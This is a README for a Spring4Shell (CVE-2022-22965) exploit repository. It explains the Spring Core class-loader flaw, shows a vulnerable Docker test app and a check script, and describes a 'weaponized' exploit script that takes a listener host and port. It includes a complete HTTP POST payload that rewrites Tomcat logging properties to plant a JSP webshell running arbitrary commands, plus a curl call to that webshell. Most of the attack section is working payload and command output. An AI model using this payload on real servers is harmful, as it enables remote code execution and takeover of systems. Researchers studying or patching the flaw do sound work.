# Spring4shell

Another Spring4Shell PoC. When I first heard about this issue I quickly tried to create a vulnerable application and figure out how this works, once the original public PoC was out I just weaponized it with reference information from that, as the original PoC is all over the internet and everyone shares their vulnerable demo app now, I just feel I can share my initial work also. 

## Summary

CVE-2022-22965 was reported this time on the very popular Java framework Spring Core on JDK9+.

 A new vulnerability was found in Spring Core on JDK9+ allowing a remote code execution as previously happened for log4j and Spring cloud. This vulnerability is referenced as Spring4shell.

The Spring Framework is a famous open-source framework used to easily build Java applications. One of the main components is Spring Core which is one of the fundamental parts of the framework. The vulnerability take advantage of an issue in this part to execute arbitrary code on the host or container.

In particular, the vulnerability affects functions that use RequestMapping annotation and POJO (Plain Old Java Object) parameters. RequestMapping uses setter and getters for id to set and get values for specific parameters.

Thus, compiling the project and hosting it on Tomcat, is possible to modify Tomcat logging properties. Consequently, it is possible to upload a webshell in the Tomcat root directory.

This old blog post explains is a good reference for expalin the issue more in depth.

http://blog.o0o.nu/2010/06/cve-2010-1622.html

## Vulnerable PoC application


Build and start PoC application with `docker-compose`

```sh
⬢  spring4shell  master ⦿ docker-compose build

Building vulnserver
Step 1/8 : FROM adoptopenjdk/maven-openjdk11:latest AS builder
 ---> 6ac0cb3aa787
Step 2/8 : COPY --chown=root:root . /home/maven/src
 ---> Using cache
 ---> 41c2ec9af829
Step 3/8 : WORKDIR /home/maven/src
 ---> Using cache
 ---> 990fd473b48e
Step 4/8 : RUN mvn clean package
 ---> Using cache
 ---> 177f3f63b9e1
Step 5/8 : FROM tomcat:9-jdk11-openjdk
 ---> 660bd4795128
Step 6/8 : EXPOSE 8080
 ---> Using cache
 ---> 35877c9321c2
Step 7/8 : COPY --from=builder /home/maven/src/target/spring4shell.war /usr/local/tomcat/webapps/
 ---> Using cache
 ---> cc89250bc910
Step 8/8 : CMD ["catalina.sh", "run"]
 ---> Using cache
 ---> 9e43476c71f9
Successfully built 9e43476c71f9
Successfully tagged spring4shell_vulnserver:latest
```

Start application

```sh
⬢  spring4shell  master ⦿ docker-compose up -d
Creating network "spring4shell_default" with the default driver
Creating spring4shell_vulnserver_1 ... done
```

## Is vulnerable

In case you are only interessted to verify if endpoint is vulnerable I wrote this quick written check script.

```sh
⬢  spring4shell  master ⦿ ./isvuln.py http://127.0.0.1:8000/spring4shell/greeting
[+] Vulnerable

⬢  spring4shell  master ⦿ ./isvuln.py http://127.0.0.1:8001/spring4shell/greeting
[-] Not vulnerable
```

## Usage

```sh
⬢  spring4shell  master ⦿ ./spring4shell.py 

   ▄▄▄▄▄   █ ▄▄  █▄▄▄▄ ▄█    ▄     ▄▀    ▄▄▄▄▄    ▄  █ ▄███▄   █    █     
  █     ▀▄ █   █ █  ▄▀ ██     █  ▄▀     █     ▀▄ █   █ █▀   ▀  █    █     
▄  ▀▀▀▀▄   █▀▀▀  █▀▀▌  ██ ██   █ █ ▀▄ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █     
 ▀▄▄▄▄▀    █     █  █  ▐█ █ █  █ █   █ ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄  
            █      █    ▐ █  █ █  ███               █  ▀███▀       ▀    ▀ 
             ▀    ▀       █   ██                   ▀                      
                                                                          
[nighter@nighter.se]
    
Usage: ./spring4shell.py <URL> <LHOST> <LPORT>
EXAMPLE: ./spring4shell.py 'http://127.0.0.1:8000/spring4shell/greeting' 192.168.1.75 7777
```

## Demo

[![asciicast](https://asciinema.org/a/VYhhBt2zcfh4NfY1kbcBPfQsu.svg)](https://asciinema.org/a/VYhhBt2zcfh4NfY1kbcBPfQsu)

## Reference

Public exploit:

```sh
⬢  spring4shell  master ⦿ ./poc.py --url http://localhost:8000/spring4shell/greeting

Vulnerable，shell ip:http://localhost:8000/spring4shell/tomcatwar.jsp?pwd=j&cmd=whoami
```

Webshell available

```sh
⬢  ~  curl 'http://localhost:8000/spring4shell/tomcatwar.jsp?pwd=j&cmd=whoami' --output -
root
```

## Burpsuite Request

If you rather use BurpSuite here is the payload.

```sh
POST /spring4shell/greeting HTTP/1.1
Host: localhost:8000
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 770

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/spring4shell&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

Note modify properties only works for Tomcat, however may be possible to modify other properties. That needs to be investigated. The public PoC requires Tomcat.

## Vulnerability

A lot of resources speculated the issue was introduced because a developer tried to fix usage of this dangerous deserialization class but that later was deemed as false. Keep this as reference just in case but seems to be a bit unrelated.


```shell 
git clone https://github.com/spring-projects/spring-framework
git checkout e681e713d4aa75be988d77f0108f80ecf15e21e9
```

https://github.com/spring-projects/spring-framework/blob/e681e713d4aa75be988d77f0108f80ecf15e21e9/spring-context-support/src/main/java/org/springframework/cache/jcache/interceptor/CacheResultInterceptor.java#L153
https://github.com/spring-projects/spring-framework/blob/e681e713d4aa75be988d77f0108f80ecf15e21e9/spring-core/src/main/java/org/springframework/util/SerializationUtils.java#L67

Here is that commit

https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529
